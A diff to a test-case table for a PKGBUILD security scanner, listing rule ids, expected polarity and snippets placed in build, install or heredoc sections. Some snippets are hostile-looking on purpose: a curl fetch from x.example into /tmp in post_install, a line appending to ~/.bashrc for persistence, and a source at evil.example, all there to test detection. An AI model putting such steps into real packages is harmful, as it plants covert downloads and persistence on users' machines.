@@ -1,7 +1,8 @@
 # Rule cases for rules.bats (ADR 0143): id  polarity(+|-)  placement  text
 # Placements: build (into build()), install (into post_install), top
 # (PKGBUILD top level), file (extra helper.sh), source / source-skip (an
-# extra source, real / SKIP sum), nosrcinfo (drop .SRCINFO), pkgbase.
+# extra source, real / SKIP sum), nosrcinfo (drop .SRCINFO), pkgbase,
+# heredoc / shheredoc (a `cat` / `sh` heredoc body in post_install).
 # @BLOB@ expands to a 120-char base64 run.
 named-pkg-install	+	build	npm install atomic-lockfile
 named-pkg-install	+	build	bun add js-digest
@@ -103,3 +104,6 @@ binary-file	-	build	true
 srcinfo-mismatch	+	srcvar	evil.example
 srcinfo-mismatch	-	srcvar	github.com
 srcinfo-mismatch	+	top	source+=("https://${_nohost}/x")
+home-persistence	-	heredoc	put this line into ~/.zshrc to enable completion
+install-network	+	shheredoc	curl -s https://x.example/p -o /tmp/p
+home-persistence	+	install	cat <<EOF >> ~/.bashrc
